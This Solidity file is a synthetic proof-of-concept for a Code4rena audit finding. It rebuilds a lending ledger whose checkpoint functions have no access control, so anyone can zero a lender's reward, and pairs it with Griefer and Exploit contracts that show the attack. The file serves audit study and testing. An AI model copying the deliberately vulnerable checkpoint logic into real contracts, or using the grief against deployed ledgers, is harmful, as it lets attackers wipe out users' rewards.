// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Canto (veRWA) — LendingLedger.checkpoint_lender() / checkpoint_market()
    have no access control and can be griefed to zero a lender's reward
    (Code4rena 2023-08-verwa, #26975, H-07)

    SYNTHETIC, CHEATCODE-FREE reproduction for the EVM Playground. LendingLedger
    is a faithful reduction using the EXACT vulnerable checkpoint bodies quoted
    in the finding (the audited repo's snapshot already contains a LATER fix —
    this bug was found and patched during Code4rena's earlier "test coverage"
    competition and is reproduced here for completeness, exactly as the finding
    itself documents and quotes). `gaugeController.gauge_relative_weight_write`
    is replaced by a minimal mock that always returns 100% weight — irrelevant
    to this bug, which lives entirely in LendingLedger's own checkpoint epoch
    bookkeeping.

    The real trigger needs a lender to have deposited in a PAST epoch, and
    calendar time to have advanced past it, before a griefer's zero-epoch
    checkpoint call can skip the "fill the gap" propagation. A cheatcode-free,
    single-timestamp `run()` cannot itself fast-forward real time, so the
    Playground's `setup.steps` (and this file's outer Foundry test, via
    `vm.store`) write LendingLedger's epoch-tracking storage directly to the
    exact state "lender deposited one epoch ago, nothing claimed yet" would
    produce. Every effect inside `run()` itself — the griefer's unauthorized
    checkpoint call, and the resulting zeroed reward at claim time — is
    produced by LendingLedger's unmodified code executing normally.
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal max()/min() helpers (real code uses OpenZeppelin's Math).
library Math {
    function max(uint256 a, uint256 b) internal pure returns (uint256) {
        return a > b ? a : b;
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

/// @dev Reduced GaugeController surface used by LendingLedger.claim(). Always
///      returns 100% weight — irrelevant to this bug, which is entirely about
///      LendingLedger's own per-lender/per-market epoch bookkeeping.
contract MockGaugeController {
    function gauge_relative_weight_write(address, uint256) external pure returns (uint256) {
        return 1e18;
    }
}

/// @title  LendingLedger
/// @notice Faithful reduction using the EXACT vulnerable `_checkpoint_market` /
///         `_checkpoint_lender` bodies quoted in finding #26975 (the version
///         that predates OpenCoreCH's fix, which the current audited-repo
///         snapshot already contains — see the file header). Every other
///         function (`sync_ledger`, `claim`, `setRewards`,
///         `whiteListLendingMarket`) is the same as the audited source.
contract LendingLedger {
    uint256 public constant WEEK = 7 days;

    address public governance; // slot 0
    MockGaugeController public gaugeController; // slot 1
    mapping(address => bool) public lendingMarketWhitelist; // slot 2
    mapping(address => mapping(address => mapping(uint256 => uint256))) public lendingMarketBalances; // slot 3
    mapping(address => mapping(address => uint256)) public lendingMarketBalancesEpoch; // slot 4
    mapping(address => mapping(uint256 => uint256)) public lendingMarketTotalBalance; // slot 5
    mapping(address => uint256) public lendingMarketTotalBalanceEpoch; // slot 6
    mapping(address => mapping(address => uint256)) public userClaimedEpoch; // slot 7
    mapping(uint256 => RewardInformation) public rewardInformation; // slot 8: packed {set: bool @byte0, amount: uint248 @bytes1-31}

    struct RewardInformation {
        bool set;
        uint248 amount;
    }

    modifier is_valid_epoch(uint256 _timestamp) {
        require(_timestamp % WEEK == 0 || _timestamp == type(uint256).max, "Invalid timestamp");
        _;
    }

    modifier onlyGovernance() {
        require(msg.sender == governance);
        _;
    }

    constructor(address _gaugeController, address _governance) {
        gaugeController = MockGaugeController(_gaugeController);
        governance = _governance;
    }

    /// @dev @> VULN: the vulnerable (pre-fix) body. `lendingMarketBalancesEpoch`
    ///      is written UNCONDITIONALLY at the end, even when the gap-fill
    ///      branch above it never ran (or only initialized bookkeeping on a
    ///      first deposit) — silently skipping the historical propagation
    ///      instead of just declining to advance the epoch. Mirrors the same
    ///      defect quoted in the finding for `_checkpoint_market` below,
    ///      applied to the finding's stated "same issue applies to
    ///      _checkpoint_lender as well".
    ///      FIX: only write the epoch when the gap-fill actually ran
    ///      (`if (updateUntilEpoch > lastUserUpdateEpoch) { ... }`).
    function _checkpoint_lender(address _market, address _lender, uint256 _forwardTimestampLimit) private {
        uint256 currEpoch = (block.timestamp / WEEK) * WEEK;
        uint256 lastUserUpdateEpoch = lendingMarketBalancesEpoch[_market][_lender];
        uint256 updateUntilEpoch = Math.min(currEpoch, _forwardTimestampLimit);
        if (lastUserUpdateEpoch == 0) {
            // Store epoch of first deposit.
            userClaimedEpoch[_market][_lender] = currEpoch;
        } else if (lastUserUpdateEpoch < currEpoch) {
            // Fill in potential gaps in the user balances history.
            uint256 lastUserBalance = lendingMarketBalances[_market][_lender][lastUserUpdateEpoch];
            for (uint256 i = lastUserUpdateEpoch; i <= updateUntilEpoch; i += WEEK) {
                lendingMarketBalances[_market][_lender][i] = lastUserBalance;
            }
        }
        lendingMarketBalancesEpoch[_market][_lender] = updateUntilEpoch; // @> VULN: unconditional
    }

    /// @dev @> Same defect as `_checkpoint_lender`, for the market-wide total.
    function _checkpoint_market(address _market, uint256 _forwardTimestampLimit) private {
        uint256 currEpoch = (block.timestamp / WEEK) * WEEK;
        uint256 lastMarketUpdateEpoch = lendingMarketTotalBalanceEpoch[_market];
        uint256 updateUntilEpoch = Math.min(currEpoch, _forwardTimestampLimit);
        if (lastMarketUpdateEpoch > 0 && lastMarketUpdateEpoch < currEpoch) {
            uint256 lastMarketBalance = lendingMarketTotalBalance[_market][lastMarketUpdateEpoch];
            for (uint256 i = lastMarketUpdateEpoch; i <= updateUntilEpoch; i += WEEK) {
                lendingMarketTotalBalance[_market][i] = lastMarketBalance;
            }
        }
        lendingMarketTotalBalanceEpoch[_market] = updateUntilEpoch; // @> unconditional too
    }

    /// @notice Trigger a checkpoint explicitly. NO ACCESS CONTROL. // @> VULN
    function checkpoint_market(address _market, uint256 _forwardTimestampLimit)
        external
        is_valid_epoch(_forwardTimestampLimit)
    {
        require(lendingMarketTotalBalanceEpoch[_market] > 0, "No deposits for this market");
        _checkpoint_market(_market, _forwardTimestampLimit);
    }

    /// @notice NO ACCESS CONTROL either — anyone can grief any lender. // @> VULN
    function checkpoint_lender(address _market, address _lender, uint256 _forwardTimestampLimit)
        external
        is_valid_epoch(_forwardTimestampLimit)
    {
        require(lendingMarketBalancesEpoch[_market][_lender] > 0, "No deposits for this lender in this market");
        _checkpoint_lender(_market, _lender, _forwardTimestampLimit);
    }

    function sync_ledger(address _lender, int256 _delta) external {
        address lendingMarket = msg.sender;
        require(lendingMarketWhitelist[lendingMarket], "Market not whitelisted");

        _checkpoint_lender(lendingMarket, _lender, type(uint256).max);
        uint256 currEpoch = (block.timestamp / WEEK) * WEEK;
        int256 updatedLenderBalance = int256(lendingMarketBalances[lendingMarket][_lender][currEpoch]) + _delta;
        require(updatedLenderBalance >= 0, "Lender balance underflow");
        lendingMarketBalances[lendingMarket][_lender][currEpoch] = uint256(updatedLenderBalance);

        _checkpoint_market(lendingMarket, type(uint256).max);
        int256 updatedMarketBalance = int256(lendingMarketTotalBalance[lendingMarket][currEpoch]) + _delta;
        require(updatedMarketBalance >= 0, "Market balance underflow");
        lendingMarketTotalBalance[lendingMarket][currEpoch] = uint256(updatedMarketBalance);
    }

    function claim(address _market, uint256 _claimFromTimestamp, uint256 _claimUpToTimestamp)
        external
        is_valid_epoch(_claimFromTimestamp)
        is_valid_epoch(_claimUpToTimestamp)
    {
        address lender = msg.sender;
        uint256 userLastClaimed = userClaimedEpoch[_market][lender];
        require(userLastClaimed > 0, "No deposits for this user");
        _checkpoint_lender(_market, lender, _claimUpToTimestamp);
        _checkpoint_market(_market, _claimUpToTimestamp);
        uint256 currEpoch = (block.timestamp / WEEK) * WEEK;
        uint256 claimStart = Math.max(userLastClaimed, _claimFromTimestamp);
        uint256 claimEnd = Math.min(currEpoch - WEEK, _claimUpToTimestamp);
        uint256 cantoToSend;
        if (claimEnd >= claimStart) {
            for (uint256 i = claimStart; i <= claimEnd; i += WEEK) {
                uint256 userBalance = lendingMarketBalances[_market][lender][i];
                uint256 marketBalance = lendingMarketTotalBalance[_market][i];
                RewardInformation memory ri = rewardInformation[i];
                require(ri.set, "Reward not set yet");
                uint256 marketWeight = gaugeController.gauge_relative_weight_write(_market, i);
                cantoToSend += (marketWeight * userBalance * ri.amount) / (1e18 * marketBalance);
            }
            userClaimedEpoch[_market][lender] = claimEnd + WEEK;
        }
        if (cantoToSend > 0) {
            (bool success,) = msg.sender.call{value: cantoToSend}("");
            require(success, "Failed to send CANTO");
        }
    }

    function setRewards(uint256 _fromEpoch, uint256 _toEpoch, uint248 _amountPerEpoch)
        external
        is_valid_epoch(_fromEpoch)
        is_valid_epoch(_toEpoch)
        onlyGovernance
    {
        for (uint256 i = _fromEpoch; i <= _toEpoch; i += WEEK) {
            RewardInformation storage ri = rewardInformation[i];
            require(!ri.set, "Rewards already set");
            ri.set = true;
            ri.amount = _amountPerEpoch;
        }
    }

    function whiteListLendingMarket(address _market, bool _isWhiteListed) external onlyGovernance {
        require(lendingMarketWhitelist[_market] != _isWhiteListed, "No change");
        lendingMarketWhitelist[_market] = _isWhiteListed;
    }

    receive() external payable {}
}

/// @dev The victim / lender. Claims rewards on its own behalf so the harm
///      (native CANTO received) is directly measurable.
contract Victim {
    receive() external payable {}

    function claimFrom(LendingLedger ledger, address market, uint256 fromTs, uint256 toTs)
        external
        returns (uint256 received)
    {
        uint256 before = address(this).balance;
        ledger.claim(market, fromTs, toTs);
        received = address(this).balance - before;
    }
}

/// @dev Anyone, with no special role, can call the unguarded checkpoint
///      functions. A dedicated contract with zero permissions makes that
///      point concrete.
contract Griefer {
    function grief(LendingLedger ledger, address market, address lender) external {
        ledger.checkpoint_lender(market, lender, 0);
    }
}

/// @dev Orchestrator. Whitelists two markets and sets a shared reward epoch.
///      M1 is left alone (control); M2's victim checkpoint is griefed. The
///      "lender deposited one epoch ago" precondition (which a real
///      `sync_ledger` deposit followed by real elapsed time would produce) is
///      planted directly into LendingLedger's storage BEFORE `run()` — see
///      the file header for why a cheatcode-free, single-timestamp `run()`
///      cannot itself fast-forward real time.
contract Exploit {
    uint256 public constant WEEK = 7 days;
    uint256 public constant REWARD = 6 ether;

    MockGaugeController public mgc; // CREATE nonce 1
    LendingLedger public ledger; // CREATE nonce 2
    Victim public victim; // CREATE nonce 3
    Griefer public griefer; // CREATE nonce 4

    address public constant M1 = address(0xCAFE1); // control market — never griefed
    address public constant M2 = address(0xCAFE2); // attacked market

    /// @notice The epoch victim deposited in (per the planted precondition —
    ///         see header) and the epoch reward was set for. Computed from
    ///         `block.timestamp` so it always matches whatever storage-seeding
    ///         step used the same formula (the fixed anvil timestamp for the
    ///         Playground, or the test's own block.timestamp for the registry).
    function depositEpoch() public view returns (uint256) {
        return (block.timestamp / WEEK) * WEEK - 2 * WEEK;
    }

    function rewardEpoch() public view returns (uint256) {
        return (block.timestamp / WEEK) * WEEK - WEEK;
    }

    constructor() {
        mgc = new MockGaugeController(); // CREATE nonce 1
        ledger = new LendingLedger(address(mgc), address(this)); // CREATE nonce 2
        victim = new Victim(); // CREATE nonce 3
        griefer = new Griefer(); // CREATE nonce 4

        ledger.whiteListLendingMarket(M1, true);
        ledger.whiteListLendingMarket(M2, true);
        ledger.setRewards(rewardEpoch(), rewardEpoch(), uint248(REWARD));
    }

    receive() external payable {}

    function run() external {
        // Precondition (planted into ledger's storage before this call, see
        // header): victim deposited DEPOSIT into both M1 and M2 at
        // depositEpoch(), reward for rewardEpoch() (= depositEpoch() + WEEK)
        // is set to REWARD, and M2's market-wide total is backed by OTHER
        // depositors (2*DEPOSIT) so reading it never divides by zero.
        uint256 e1 = rewardEpoch();

        // Anyone, with zero permissions, grieves the victim's M2 checkpoint.
        griefer.grief(ledger, M2, address(victim));

        // Victim claims from the GRIEFED market: reward is silently zeroed.
        uint256 griefedReward = victim.claimFrom(ledger, M2, e1, e1);

        // Victim claims from the CONTROL market (never griefed): full reward.
        uint256 controlReward = victim.claimFrom(ledger, M1, e1, e1);

        require(griefedReward == 0, "expected griefed claim to be 0");
        require(controlReward == REWARD, "expected control claim to receive the full reward");
    }
}
